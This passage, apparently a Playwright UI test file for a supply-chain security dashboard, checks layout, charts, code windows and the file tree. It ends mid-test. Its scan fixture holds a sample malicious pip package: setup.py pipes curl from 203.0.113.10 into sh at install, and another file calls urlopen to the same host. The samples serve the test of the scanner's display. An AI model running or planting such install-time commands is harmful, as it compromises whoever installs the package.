import { readFileSync } from 'node:fs';
import type { Page } from '@playwright/test';
import type { Evidence, Scan } from '../src/lib/types';
import { expect, SHOTS, test } from './fixtures';

// R1 11/04 — React 이식 1단계(공통 기반). 목업 main cf4c5f7 의 확정 결정(mock/README.md 11/04d · 11/04e · 11/04f)과
// 목업 회귀 ui-1104 · reorder-1104 · codewin-1104 · tree-1104 · chat-1104 가 확인하는 동작을 React 로 옮겼는지 본다.
//   A 스크롤 없는 페이지 틀(768 이상) · 390   B 모션 토큰   C KPI 카드 · SVG 차트(무대 r1-harness.tsx)
//   D 코드 창 6곳   E 파일 트리   F AI 도우미 채팅   G 길게 눌러 옮기기   H 다크 · reduced-motion
// 시간에 따라 다시 그려지는 요소는 단언마다 새로 찾는다(locator 는 늘 새로 찾는다 — 붙잡아 둔 ElementHandle 을 쓰지 않는다).

const SCRATCH = process.env.R1_SHOTS || SHOTS;
type Json = Record<string, unknown>;
const load = (f: string) => JSON.parse(readFileSync(new URL(`./evaluation/${f}.json`, import.meta.url), 'utf8')) as Json;
const EVAL = { static: load('static'), runtime: load('runtime'), model: load('model'), modelAll: load('model-all') };
const evalApi = (page: Page) => page.route(/\/api\/evaluation$/, (r) => r.fulfill({ contentType: 'application/json', body: JSON.stringify(EVAL) }));

// 공급망 검사 — 폴더에 걸친 위협 파일(트리) · 코드
const now = new Date().toISOString();
const SCAN: Scan = {
  id: 'scan-0901',
  target: { kind: 'package', manager: 'pip', name: 'evilpkg', version: '0.1.0', label: 'pip evilpkg==0.1.0' },
  status: 'done', startedAt: now, finishedAt: now, verdict: 'malicious', risk: { score: 8.2, label: 'high_risk' },
  engines: [{ name: 'GuardDog', version: '3.2.0' }, { name: 'OSV-Scanner', version: '2.7.0' }],
  findings: [
    { rule: 'threat-setup-exec', category: 'threat', message: 'Runs a command at install', file: 'setup.py', line: 4, match: 'os.system' },
    { rule: 'network-exfil', category: 'threat', message: 'Sends data out', file: 'pkg/evil/__init__.py', line: 3, match: 'urlopen' },
    { rule: 'dynamic-import', category: 'capability', message: 'Imports at runtime', file: 'pkg/util.py', line: 2, match: '__import__' },
    { rule: 'env-read', category: 'capability', message: 'Reads env', file: 'lib/helpers.py', line: 1, match: 'environ' },
  ],
  vulns: [], packages: [],
  files: {
    'setup.py': 'from setuptools import setup\nimport os\n\nos.system("curl http://203.0.113.10/x | sh")\nsetup(name="evilpkg")',
    'pkg/evil/__init__.py': 'import urllib.request\n\nurllib.request.urlopen("http://203.0.113.10/c")',
    'pkg/util.py': 'def load(n):\n    return __import__(n)',
    'lib/helpers.py': 'import os; os.environ.get("HOME")',
  },
  caseId: null, threats: 2, capabilities: 2, vulnCount: 0, vulnMax: null, installThreats: 1,
};
async function scansApi(page: Page, scans: Scan[] = [SCAN]) {
  await page.route(/\/api\/scans(\/|$|\?)/, (route) => {
    const path = new URL(route.request().url()).pathname.replace(/^\/api/, '');
    const json = (d: unknown, status = 200) => route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(d) });
    if (path === '/scans') return json(scans.map(({ findings, vulns, packages, files, ...s }) => (void findings, void vulns, void packages, void files, s)));
    const m = path.match(/^\/scans\/([^/]+)$/);
    const s = m && scans.find((x) => x.id === m[1]);
    return s ? json(s) : json({ error: '검사 없음' }, 404);
  });
}

// ── 공통 측정 ──
const tok = (page: Page, name: string) => page.evaluate((n) => getComputedStyle(document.documentElement).getPropertyValue(n).trim(), name);
// 토큰 색을 계산된 rgb 로(비교용)
const rgbOf = (page: Page, name: string, prop = 'color') =>
  page.evaluate(
    ([n, p]) => {
      const e = document.createElement('i');
      e.style.setProperty(p === 'color' ? 'color' : 'background-color', `var(${n})`);
      document.body.append(e);
      const v = getComputedStyle(e)[p === 'color' ? 'color' : 'backgroundColor'];
      e.remove();
      return v;
    },
    [name, prop] as const,
  );
// 768 이상: 문서 · main 스크롤 0, 넘쳐서 스크롤하는 요소는 채움 칸([data-fill]) 안에만(시트 · 대화상자 · 도우미는 제외)
async function scrollAudit(page: Page) {
  return page.evaluate(() => {
    const main = document.querySelector('main')!;
    const se = document.scrollingElement!;
    const allowed = (e: Element) => !!e.closest('[data-fill], [data-sheet], dialog, [data-part="assistant"]');
    const bad = [...main.querySelectorAll('*')]
      .filter((e) => {
        const cs = getComputedStyle(e);
        return /(auto|scroll)/.test(cs.overflowY) && e.scrollHeight > e.clientHeight + 1 && !allowed(e);
      })
      .map((e) => `${e.tagName.toLowerCase()}[${e.getAttribute('data-part') ?? e.getAttribute('data-testid') ?? String(e.className).split(' ').slice(0, 3).join('.')}]+${e.scrollHeight - e.clientHeight}`);
    return { doc: se.scrollHeight - innerHeight, docW: se.scrollWidth - innerWidth, main: main.scrollHeight - main.clientHeight, page: document.querySelectorAll('main [data-page=""]').length, fills: document.querySelectorAll('main [data-page=""] [data-fill]').length, bad }; // R4 11/04: 쪽 단추(TablePager)도 data-page="1" 등을 달아 화면 틀만 센다
  });
}

const SCREENS: [string, string, (p: Page) => Promise<void>][] = [
  ['dashboard', '/', (p) => expect(p.getByTestId('pending')).toBeVisible()],
  ['installs', '/installs', (p) => expect(p.getByTestId('installs')).toBeVisible()],
  ['scans', '/scans', (p) => expect(p.locator('[data-scan="scan-0901"]').first()).toBeVisible()],
  ['evaluation', '/evaluation', (p) => expect(p.locator('[data-part="evaluation"][data-state="ready"]')).toBeVisible()],
  ['events', '/events', (p) => expect(p.getByTestId('events')).toBeVisible()],
  ['topology', '/topology', (p) => expect(p.getByTestId('topology')).toBeVisible()],
  ['policies', '/policies?id=egress-allowlist', (p) => expect(p.getByTestId('editor')).toBeVisible()],
  ['audit', '/audit', (p) => expect(p.getByTestId('audit')).toBeVisible()],
  ['settings', '/settings', (p) => expect(p.locator('[data-part="settings-tabs"]')).toBeVisible()],
];

// ── A 스크롤 없는 페이지 틀 ──
test.describe('A 스크롤 없는 페이지(768 이상) · 390', () => {
  for (const [w, hh] of [
    [1280, 720],
    [1440, 900],
    [1920, 1080],
  ]) {
    test.describe(`${w}×${hh}`, () => {
      test.use({ viewport: { width: w, height: hh } });
      test('주요 화면: 문서 · main 스크롤 0, 스크롤은 채움 칸 안에서만', async ({ page, backend }) => {
        void backend;
        await scansApi(page);
        await evalApi(page);
        for (const [name, url, ready] of SCREENS) {
          await page.goto(url);
          await ready(page);
          await page.waitForTimeout(300);
          const r = await scrollAudit(page);
          expect(r, name).toMatchObject({ doc: 0, docW: 0, main: 0, page: 1, bad: [] });
          expect(r.fills, `${name} 채움 칸`).toBeGreaterThan(0);
          if (w === 1440 && name === 'dashboard') await page.screenshot({ path: `${SCRATCH}/r1-dashboard.png` });
        }
      });
    });
  }

  test.describe('높이 800 이하', () => {
    test.use({ viewport: { width: 1280, height: 720 } });
    test('차트 높이 토큰 --chart-h 하한 120px', async ({ page, backend }) => {
      void backend;
      await page.goto('/');
      await expect(page.getByTestId('pending')).toBeVisible();
      expect(await page.evaluate(() => { const e = document.createElement('i'); e.style.height = 'var(--chart-h)'; e.style.display = 'block'; document.body.append(e); const v = e.getBoundingClientRect().height; e.remove(); return v; })).toBe(120);
    });
  });

  test.describe('390', () => {
    test.use({ viewport: { width: 390, height: 844 } });
    test('가로 넘침 0(문서 세로 스크롤은 허용) · 화면 틀 있음', async ({ page, backend }) => {
      void backend;
      await scansApi(page);
      await evalApi(page);
      for (const [name, url, ready] of SCREENS) {
        await page.goto(url);
        await ready(page);
        const r = await scrollAudit(page);
        expect(r.docW, name).toBe(0);
        expect(r.page, name).toBe(1);
      }
      await page.goto('/');
      await expect(page.getByTestId('pending')).toBeVisible();
      await page.screenshot({ path: `${SCRATCH}/r1-390.png` });
    });
  });
});

// ── B 모션 토큰 ──
test.describe('B 모션 토큰', () => {
  test('스켈레톤 · 새 위반 행 · 맥동 · 회전 · 점 깜빡임 · KPI 링 길이는 모션 토큰에서(--t-slow 를 바꾸면 따라 바뀐다)', async ({ page, backend }) => {
    void backend;
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    const durs = () =>
      page.evaluate(() => {
        const out: Record<string, string> = {};
        for (const c of ['sg-skeleton', 'sg-flash', 'sg-pulse-ring', 'sg-spin', 'sg-blink', 'kpi-ring']) {
          const e = document.createElement('div');
          e.className = c;
          document.body.append(e);
          out[c] = getComputedStyle(e).animationDuration;
          e.remove();
        }
        return out;
      });
    const before = await durs();
    for (const [k, v] of Object.entries(before)) expect(v, k).not.toBe('0s');
    await page.evaluate(() => document.documentElement.style.setProperty('--t-slow', '100ms'));
    const after = await durs();
    for (const k of Object.keys(before)) expect(after[k], `${k} 가 토큰을 따르지 않음 ${before[k]} → ${after[k]}`).not.toBe(before[k]);
    expect(after['kpi-ring']).toBe('0.2s'); // --t-slow × 2
  });
});

// ── C KPI 카드 · SVG 차트(무대) ──
type Stage = { update: (p: unknown) => void; unmount: () => void };
async function stage(page: Page, kind: string, props: unknown) {
  await page.evaluate(async ([k, p]) => {
    const w = window as unknown as { __r1?: { mount: (k: string, p: unknown) => Stage }; __st?: Stage };
    const harness = '/e2e/r1-harness.tsx'; // 브라우저(Vite 개발 서버)에서 불러온다 — 타입 검사 대상 아님
    if (!w.__r1) await import(/* @vite-ignore */ harness);
    w.__st?.unmount();
    w.__st = w.__r1!.mount(k as string, p);
  }, [kind, props] as const);
}
const restage = (page: Page, props: unknown) => page.evaluate((p) => (window as unknown as { __st: Stage }).__st.update(p), props);
const STAGE = '[data-r1-stage]';

test.describe('C KPI 카드', () => {
  test('띠 · 아이콘 칩 · 값 28/700 · 단위 분리 · 0 이면 띠만 색 · 위반 증가만 빨강 · 처음은 바로 값, 바뀔 때만 카운트업 + 링', async ({ page, backend }) => {
    void backend;
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    const base = { k: 'violations', label: '위반', icon: '⚠', stripe: 'danger', tone: 'danger', sub: '격리 3 · 경고 2', box: { w: 260, h: 140 } };
    await stage(page, 'kpi', { ...base, value: 1234, delta: { dir: 'up', text: '5', tone: 'danger', note: '지난 24시간 대비' } });
    const card = page.locator(`${STAGE} [data-kpi="violations"]`);
    // 처음 그리기는 바로 값(0 에서 세지 않는다)
    expect(await card.locator('[data-value]').textContent()).toBe('1,234');
    const m = await card.evaluate((e) => {
      const cs = getComputedStyle(e);
      const v = getComputedStyle(e.querySelector('.kpi-val')!);
      const ico = e.querySelector('.kpi-ico') as HTMLElement;
      return { stripe: cs.borderLeftWidth, stripeColor: cs.borderLeftColor, radius: cs.borderRadius, size: v.fontSize, weight: v.fontWeight, valColor: v.color, icon: ico?.dataset.icon, icoW: ico?.getBoundingClientRect().width, deltaTone: (e.querySelector('.kpi-delta') as HTMLElement).dataset.deltaTone, deltaColor: getComputedStyle(e.querySelector('.kpi-delta b')!).color };
    });
    expect(m).toMatchObject({ stripe: '4px', radius: '8px', size: '28px', weight: '700', icon: '⚠', icoW: 32, deltaTone: 'danger' });
    expect(m.stripeColor).toBe(await rgbOf(page, '--danger'));
    expect(m.valColor).toBe(await rgbOf(page, '--danger'));
    expect(m.deltaColor).toBe(await rgbOf(page, '--danger'));
    // 값이 바뀌면 카운트업(중간 값을 지나) + 짧은 링
    await restage(page, { ...base, value: 2234, delta: { dir: 'up', text: '5', tone: 'danger', note: '지난 24시간 대비' } });
    await expect(card).toHaveClass(/kpi-ring/);
    const mid = Number((await card.locator('[data-value]').textContent())!.replace(/,/g, ''));
    expect(mid).toBeGreaterThanOrEqual(1234);
    await expect(card.locator('[data-value]')).toHaveText('2,234');
    // 0 이면 띠만 색 — 숫자는 기본 색, is-zero
    await restage(page, { ...base, value: 0, delta: { dir: 'none' } });
    await expect(card).toHaveClass(/is-zero/);
    await expect(card.locator('[data-value]')).toHaveText('0');
    expect(await card.locator('.kpi-val').evaluate((e) => getComputedStyle(e).color)).toBe(await rgbOf(page, '--text'));
    await expect(card.locator('.kpi-delta')).toHaveText('이전 기간 정보 없음');
    // 격리 지연 증가는 경고색(빨강 아님) · 단위 분리
    await stage(page, 'kpi', { k: 'isolation', label: '격리 지연 중앙값', icon: '◷', stripe: 'warn', value: 312, unit: 'ms', sub: 'p95 400 ms', delta: { dir: 'up', text: '12ms', tone: 'warn', note: '지난 24시간 대비' }, box: { w: 260, h: 140 } });
    const iso = page.locator(`${STAGE} [data-kpi="isolation"]`);
    await expect(iso.locator('[data-value]')).toHaveText('312ms');
    expect(await iso.locator('.kpi-unit').evaluate((e) => [getComputedStyle(e).fontSize, getComputedStyle(e).fontWeight])).toEqual(['13px', '500']);
    expect(await iso.locator('.kpi-delta b').evaluate((e) => getComputedStyle(e).color)).not.toBe(await rgbOf(page, '--danger'));
    // 글자 값(평가 지표처럼 빈 값 · 퍼센트)도 같은 모양 — 빈 값은 빈 칸(11/09)
    await stage(page, 'kpi', { k: 'f1', label: '모델 시험 F1', icon: '◔', stripe: 'ok', value: null, text: '', sub: '모델 결과 없음', box: { w: 260, h: 140 } });
    await expect(page.locator(`${STAGE} [data-kpi="f1"] [data-value]`)).toHaveText('');
    await expect(page.locator(`${STAGE} [data-kpi="f1"]`)).toHaveClass(/is-zero/);
  });

  test('reduced-motion: 값이 바뀌어도 바로 값 · 링 없음', async ({ page, backend }) => {
    void backend;
    await page.emulateMedia({ reducedMotion: 'reduce' });
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    const base = { k: 'collected', label: '수집한 이벤트', icon: '▦', stripe: 'accent', sub: '', box: { w: 260, h: 140 } };
    await stage(page, 'kpi', { ...base, value: 10 });
    await restage(page, { ...base, value: 99999 });
    expect(await page.locator(`${STAGE} [data-kpi="collected"] [data-value]`).textContent()).toBe('99,999');
    expect(await page.locator(`${STAGE} [data-kpi="collected"]`).evaluate((e) => getComputedStyle(e).animationName)).toBe('none');
  });

  // 11/09 저녁: 평가 지표 6칸 → 위 3칸(나머지 3칸은 목록 줄 요약, eval-accordion-1109) — 모양 규칙은 그대로
  test('평가 위 3칸 = KPI 카드 모양(띠 · 아이콘 칩 · 28/700)', async ({ page, backend }) => {
    void backend;
    await evalApi(page);
    await page.goto('/evaluation');
    await expect(page.locator('[data-part="evaluation"][data-state="ready"]')).toBeVisible();
    const cards = page.locator('[data-part="eval-top"] [data-kpi]');
    await expect(cards).toHaveCount(3);
    const m = await cards.evaluateAll((els) => els.map((e) => [e.classList.contains('kpi-card'), getComputedStyle(e).borderLeftWidth, !!e.querySelector('.kpi-ico[data-icon]'), getComputedStyle(e.querySelector('.kpi-val')!).fontSize, getComputedStyle(e.querySelector('.kpi-val')!).fontWeight]));
    for (const x of m) expect(x).toEqual([true, '4px', true, '28px', '700']);
  });
});

test.describe('C SVG 차트(Recharts 없음)', () => {
  const T0 = Date.parse('2026-11-04T00:00:00Z');
  const series = (n: number, f: (i: number) => Record<string, number>) => Array.from({ length: n }, (_, i) => ({ t: new Date(T0 + i * 3600_000).toISOString(), ...f(i) }));
  test('선: 굵기 2 · 점선 가로 격자만 · 끝 라벨 · 첫 렌더만 그리기 · 반전 툴팁', async ({ page, backend }) => {
    void backend;
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    const keys = [['exec', '실행', '--k-exec'], ['open', '파일', '--k-open']];
    await stage(page, 'line', { name: 'collected', label: '수집량 추이', keys, data: series(12, (i) => ({ exec: 10 + i, open: 30 - i })), step: 3600, box: { w: 520, h: 200 } });
    const C = `${STAGE} [data-chart="collected"]`;
    await expect(page.locator(`${C} path.line`)).toHaveCount(2);
    expect(await page.locator(`${C} path.line`).first().getAttribute('stroke-width')).toBe('2');
    await expect(page.locator(`${C} .lines`)).toHaveClass(/draw-in/);
    await expect(page.locator(`${C} text.end-label`)).toHaveText(['실행 21', '파일 19']); // 위에서 아래로(값 큰 것이 위)
    expect(await page.locator(`${C} line.grid`).evaluateAll((ls) => ls.every((l) => l.getAttribute('stroke-dasharray') === '3 4'))).toBe(true);
    expect(await page.locator(`${C} .tick-y`).evaluateAll((t) => t.map((x) => getComputedStyle(x).fontSize))).toContain('12px');
    await page.locator(`${C} g[data-bucket] rect.hit`).nth(5).hover();
    const tip = page.locator(`${C} [data-part="chart-tip"]`);
    await expect(tip).toBeVisible();
    expect(await tip.evaluate((e) => getComputedStyle(e).backgroundColor)).toBe(await rgbOf(page, '--ink', 'bg'));
    // 값 갱신은 그리기 애니메이션 없이
    await page.waitForTimeout(800);
    await restage(page, { name: 'collected', label: '수집량 추이', keys, data: series(12, (i) => ({ exec: 11 + i, open: 31 - i })), step: 3600, box: { w: 520, h: 200 } });
    await expect(page.locator(`${C} text.end-label`).first()).toHaveText('실행 22');
    await expect(page.locator(`${C} .lines`)).not.toHaveClass(/draw-in/);
  });

  test('막대: 최대 폭 22 · 맨 위 조각만 둥근 모서리 · 0 칸 회색 줄 / 도넛: 안 58% · 밖 84% · 가운데 합 · 합 0 이면 회색 고리', async ({ page, backend }) => {
    void backend;
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    await stage(page, 'bars', { name: 'violations', label: '위반 추이', keys: [['killed', '격리', 'k-killed'], ['alert', '경고', 'k-alert']], data: series(6, (i) => (i === 2 ? { killed: 0, alert: 0 } : { killed: i, alert: 2 })), step: 3600, box: { w: 520, h: 200 } });
    const B = `${STAGE} [data-chart="violations"]`;
    const widths = await page.locator(`${B} .bar.seg`).evaluateAll((els) => els.map((e) => (e as SVGGraphicsElement).getBBox().width));
    expect(Math.max(...widths)).toBeLessThanOrEqual(22.01);
    await expect(page.locator(`${B} g[data-bucket]`).nth(2).locator('.bar.zero')).toHaveCount(1);
    // 조각 2개인 칸: 아래 rect · 맨 위 path(둥근 모서리)
    const tags = await page.locator(`${B} g[data-bucket]`).nth(3).locator('.bar.seg').evaluateAll((els) => els.map((e) => e.tagName));
    expect(tags).toEqual(['rect', 'path']);
    await expect(page.locator(`${B} .chart-legend`)).toContainText('격리 13');

    await stage(page, 'donut', { name: 'results', label: '설치 검사 결과', centerLabel: '설치', items: [['passed', '통과', 'dn-passed', 6], ['isolated', '격리', 'dn-isolated', 3], ['warned', '경고', 'dn-warned', 1]], box: { w: 220, h: 220 } });
    const D = `${STAGE} [data-chart="results"]`;
    await expect(page.locator(`${D} path.slice`)).toHaveCount(3);
    await expect(page.locator(`${D} [data-part="donut-center"]`)).toHaveText('10');
    expect(await page.locator(D).evaluate((e) => [(e as HTMLElement).dataset.inner, (e as HTMLElement).dataset.outer])).toEqual(['0.58', '0.84']);
    await stage(page, 'donut', { name: 'results', label: '설치 검사 결과', items: [['passed', '통과', 'dn-passed', 0]], box: { w: 220, h: 220 } });
    await expect(page.locator(`${D} circle.donut-zero`)).toHaveCount(1);
    await expect(page.locator(`${D} [data-part="donut-center"]`)).toHaveText('0');
  });
});

// ── D 코드 창 6곳 ──
const CW = '.code-win[data-codewin]';
async function codeWinOf(page: Page, sel: string) {
  return page.locator(sel).evaluate((w) => {
    const body = w.querySelector('.cw-body')!;
    const cs = getComputedStyle(w);
    return {
      tag: w.tagName.toLowerCase(),
      dots: w.querySelectorAll('.cw-head .cw-dot').length,
      name: w.querySelector('.cw-name')?.textContent ?? null,
      lang: w.querySelector('.cw-tag')?.textContent ?? null,
      wrap: (w as HTMLElement).dataset.wrap,
      click: (w as HTMLElement).dataset.click ?? null,
      radius: cs.borderRadius,
      bodyBg: getComputedStyle(body).backgroundColor,
      bodyFont: getComputedStyle(body).fontSize,
      bodyTag: body.tagName.toLowerCase(),
    };
  });
}
test.describe('D 코드 창(macOS 창 모양)', () => {
  test('① 공급망 검사 코드: 파일명 = 경로 · python · 어두운 코드 바탕 · 줄 번호 · 위협 줄 그대로 · 읽기 전용은 떠오르지 않음', async ({ page, backend }) => {
    void backend;
    await scansApi(page);
    await page.goto('/scans?id=scan-0901');
    const sheet = page.locator('[data-sheet="scan"]');
    await expect(sheet.locator('[data-part="verdict"]')).toBeVisible();
    const sel = `[data-sheet="scan"] [data-part="code"] ${CW}`;
    const m = await codeWinOf(page, sel);
    expect(m).toMatchObject({ dots: 3, name: 'setup.py', lang: 'python', radius: '8px', bodyFont: '13px', click: null });
    expect(m.bodyBg).toBe(await rgbOf(page, '--code-bg', 'bg'));
    await expect(page.locator(`${sel} [data-line="4"].hl-threat`)).toHaveCount(1);
    await expect(page.locator(`${sel} [data-line="4"] mark`)).toHaveText('os.system');
    await page.locator(sel).hover();
    await page.waitForTimeout(300);
    expect(await page.locator(sel).evaluate((e) => getComputedStyle(e).transform)).toBe('none');
    await page.screenshot({ path: `${SCRATCH}/r1-scan-code.png` });
  });

  test('② 이벤트 원본 JSON: event.json · JSON · 가로 스크롤(wrap 0)', async ({ page, backend }) => {
    void backend;
    await page.goto('/events?id=7');
    const sel = `[data-sheet="event"] ${CW}`;
    await expect(page.locator(sel)).toBeVisible();
    expect(await codeWinOf(page, sel)).toMatchObject({ dots: 3, name: 'event.json', lang: 'JSON', wrap: '0' });
    await expect(page.locator(`${sel} .cw-body`)).toContainText('"containerName"');
  });

  test('③ 증거 로그: 파일명 없음 · log · 줄바꿈(wrap 1) / 파일 변경: 여러 폴더면 트리 + A · C · D, 한 폴더면 표', async ({ page, backend }) => {
    const ctr = backend.installs.find((s) => s.id === 'ins-0012')!.container;
    const row = backend.audit.find((a) => a.event.containerName === ctr && a.enforced)!;
    const cid = row.event.containerId;
    const t = (m: number) => new Date(Date.now() - m * 60_000).toISOString();
    const evs: Evidence[] = [
      { id: 'ev-3', containerId: cid, containerName: ctr, image: 'python:3.12-slim', collectedAt: t(10), logs: 'Collecting reqeusts\nRunning setup.py', partial: false, durationMs: 300, changes: [{ kind: 'A', path: '/tmp/p.sh' }, { kind: 'C', path: '/root/.bashrc' }, { kind: 'D', path: '/var/log/pip.log' }], processes: [] },
      { id: 'ev-2', containerId: cid, containerName: ctr, image: 'python:3.12-slim', collectedAt: t(11), logs: 'first', partial: false, durationMs: 120, changes: [{ kind: 'A', path: '/tmp/a' }, { kind: 'A', path: '/tmp/b' }], processes: [] },
    ];
    backend.evidence = evs;
    await page.goto(`/audit?id=${row.id}&tab=evidence`);
    const ev3 = page.locator('[data-evidence="ev-3"]');
    await expect(ev3).toBeVisible();
    const logSel = `[data-evidence="ev-3"] ${CW}`;
    expect(await codeWinOf(page, logSel)).toMatchObject({ dots: 3, name: null, lang: 'log', wrap: '1' });
    await expect(ev3.locator('[data-part="evidence-logs"]')).toContainText('Running setup.py');
    const tree = ev3.locator('[data-part="evidence-changes"]');
    await expect(tree.locator('[role="tree"]')).toHaveCount(1);
    await expect(tree.locator('[data-change-kind]')).toHaveText(['C', 'A', 'D']); // 폴더 이름순(/root · /tmp · /var)
    await expect(tree.locator('[role="treeitem"][data-kind="file"]')).toHaveCount(3);
    await expect(tree.locator('[role="treeitem"][aria-selected]')).toHaveCount(0); // 선택 없음
    expect(await tree.locator('[role="treeitem"][data-kind="dir"]').evaluateAll((e) => e.map((x) => x.getAttribute('aria-expanded')))).not.toContain('false'); // 모두 펼침
    // 한 폴더(/tmp)뿐이면 표 그대로
    await expect(page.locator('[data-evidence="ev-2"] table[data-part="evidence-changes"] [data-change-kind]')).toHaveText(['A', 'A']);
  });

  test('⑤ 정책 YAML: <id>.yaml · 입력칸이 곧 코드 영역(wrap off) · 전체 YAML 은 policies.yaml', async ({ page, backend }) => {
    void backend;
    await page.goto('/policies?id=egress-allowlist');
    await expect(page.getByTestId('editor')).toBeVisible();
    await page.locator('[data-mode="yaml"]').click();
    const sel = `[data-testid="editor"] ${CW}`;
    const m = await codeWinOf(page, sel);
    expect(m).toMatchObject({ dots: 3, name: 'egress-allowlist.yaml', lang: 'YAML', bodyTag: 'textarea' });
    expect(m.bodyBg).toBe(await rgbOf(page, '--code-bg', 'bg'));
    const ta = page.locator(`${sel} textarea[aria-label="정책 YAML"]`);
    await expect(ta).toHaveAttribute('wrap', 'off');
    await expect(ta).toHaveValue(/egress-allowlist/);
    // 11/09: 전체 YAML 은 머리 「YAML 일괄 적용」 큰 창
    await page.goto('/policies');
    await page.getByRole('button', { name: 'YAML 일괄 적용' }).click();
    const all = `dialog[data-part="bulk-yaml"] ${CW}`;
    await expect(page.locator(`${all} textarea[aria-label="전체 정책 YAML"]`)).toBeVisible();
    expect(await codeWinOf(page, all)).toMatchObject({ name: 'policies.yaml', lang: 'YAML', bodyTag: 'textarea' });
  });

  test('⑥ AI 도우미 답 속 코드 블록(```json event.json) → 코드 창, 흘려보내는 중 안 닫힌 블록도 창', async ({ page, backend }) => {
    backend.info.chat = true;
    backend.chatReply = {
      events: [
        ['token', '격리 이유입니다.\n```json event.json\n{"kind": "exec",\n "comm": "sh"}\n```\n끝.'],
        ['done', {}],
      ],
    };
    await page.goto('/');
    await expect(page.locator('[data-part="assistant-fab"]')).toHaveAttribute('data-ready', 'true');
    await page.locator('[data-part="assistant-fab"]').click();
    await page.locator('[data-part="assistant"]').getByRole('tab', { name: 'AI 도우미' }).click();
    await page.getByRole('textbox', { name: '질문' }).fill('왜 격리됐어?');
    await page.getByRole('textbox', { name: '질문' }).press('Enter');
    const sel = `[data-part="chat"] [data-role="assistant"] ${CW}`;
    await expect(page.locator(sel)).toHaveCount(1);
    expect(await codeWinOf(page, sel)).toMatchObject({ name: 'event.json', lang: 'JSON' });
    await expect(page.locator(`${sel} .cw-body`)).toContainText('"comm": "sh"');
    await expect(page.locator('[data-part="chat"] [data-role="assistant"] [data-part="chat-bubble"]')).toContainText('끝.');
  });

  test('부품 계약: 눌러서 여는 카드만 떠오름(translateY -5px) · 키보드로 열림', async ({ page, backend }) => {
    void backend;
    await page.goto('/');
    await expect(page.getByTestId('pending')).toBeVisible();
    await stage(page, 'codewin', { name: 'run.log', clickable: true, children: 'line 1', box: { w: 360, h: 160 } });
    const w = page.locator(`${STAGE} ${CW}`);
    await expect(w).toHaveAttribute('data-click', '1');
    await expect(w).toHaveAttribute('role', 'button');
    await expect(w.locator('.cw-tag')).toHaveText('log');
    await w.hover();
    await expect.poll(() => w.evaluate((e) => getComputedStyle(e).transform)).toContain('-5');
  });
});

// ── E 파일 트리 ──
test.describe('E 파일 트리', () => {
  test('공급망 검사: 트리(왼쪽) + 코드 창 · 위협 폴더 기본 펼침 · 배지 · 키보드(↑↓ → ← Home End Enter) · 위협 행 「이름:줄」 + 전체 경로 툴팁', async ({ page, backend }) => {
    void backend;
    await scansApi(page);
    await page.goto('/scans?id=scan-0901');
    const code = page.locator('[data-sheet="scan"] [data-part="code"]');
    const tree = code.locator('[role="tree"]');
    await expect(tree).toBeVisible();
    const item = (p: string) => tree.locator(`[role="treeitem"][data-path="${p}"]`);
    // 폴더 먼저 · 이름순, 위협 파일이 든 폴더만 펼침
    await expect(item('pkg')).toHaveAttribute('aria-expanded', 'true');
    await expect(item('pkg/evil')).toHaveAttribute('aria-expanded', 'true');
    await expect(item('lib')).toHaveAttribute('aria-expanded', 'false');
    await expect(item('setup.py')).toHaveAttribute('aria-selected', 'true');
    await expect(item('setup.py').locator('.ft-badge.ft-threat')).toHaveText('1');
    await expect(item('pkg/util.py').locator('.ft-badge')).toHaveCount(0);
    await expect(item('lib/helpers.py')).toBeHidden();
    // 왼쪽 트리 · 오른쪽 코드 창
    const [tb, cb] = await Promise.all([tree.boundingBox(), code.locator(CW).boundingBox()]);
    expect(tb!.x + tb!.width).toBeLessThanOrEqual(cb!.x + 1);
    // 키보드: Tab 한 칸 = 선택 항목
    await expect(tree.locator('[role="treeitem"][tabindex="0"]')).toHaveCount(1);
    await item('setup.py').focus();
    await page.keyboard.press('Home');
    await expect(item('lib')).toBeFocused();
    await page.keyboard.press('ArrowRight');
    await expect(item('lib')).toHaveAttribute('aria-expanded', 'true');
    await page.keyboard.press('ArrowRight');
    await expect(item('lib/helpers.py')).toBeFocused();
    await page.keyboard.press('ArrowLeft');
    await expect(item('lib')).toBeFocused();
    await page.keyboard.press('ArrowLeft');
    await expect(item('lib')).toHaveAttribute('aria-expanded', 'false');
    await page.keyboard.press('ArrowDown');
    await expect(item('pkg')).toBeFocused();
    await page.keyboard.press('End');
    await expect(item('setup.py')).toBeFocused();
    await page.keyboard.press('ArrowUp');
    await expect(item('pkg/util.py')).toBeFocused();
    await page.keyboard.press('Enter');
    await expect(item('pkg/util.py')).toHaveAttribute('aria-selected', 'true');
    await expect(code.locator(`${CW} .cw-name`)).toHaveText('pkg/util.py');
    await expect(item('pkg/util.py')).toBeFocused();
    // 같은 선택으로 다시 그려도 사용자가 접은 폴더는 접힌 채
    await item('pkg/evil').locator(':scope > .ft-row').click();
    await expect(item('pkg/evil')).toHaveAttribute('aria-expanded', 'false');
    // 위협 목록 → 그 파일 · 그 줄(딥링크) — 접힌 부모를 펼친다
    const f = page.locator('[data-sheet="scan"] [data-finding][data-loc="pkg/evil/__init__.py:3"]');
    await expect(f.locator('span').first()).toHaveText('__init__.py:3');
    await expect(f.locator('span').first()).toHaveAttribute('title', 'pkg/evil/__init__.py:3');
    await f.click();
    await expect(code.locator(`${CW} .cw-name`)).toHaveText('pkg/evil/__init__.py');
    await expect(item('pkg/evil')).toHaveAttribute('aria-expanded', 'true');
    await expect(item('pkg/evil/__init__.py')).toHaveAttribute('aria-selected', 'true');
    await expect(code.locator('[data-line="3"].focus')).toHaveCount(1);
  });

  test('접힘 = grid-template-rows 0fr · 끝나면 visibility hidden · reduced-motion 이면 즉시', async ({ page, backend }) => {
    void backend;
    await scansApi(page);
    await page.emulateMedia({ reducedMotion: 'reduce' });
    await page.goto('/scans?id=scan-0901');
    const lib = page.locator('[data-sheet="scan"] [role="treeitem"][data-path="lib"]');
    await expect(lib).toBeVisible();
    const m = await lib.evaluate((li) => {
      const kids = li.querySelector(':scope > .ft-kids') as HTMLElement;
      const grp = kids.querySelector('[role="group"]') as HTMLElement;
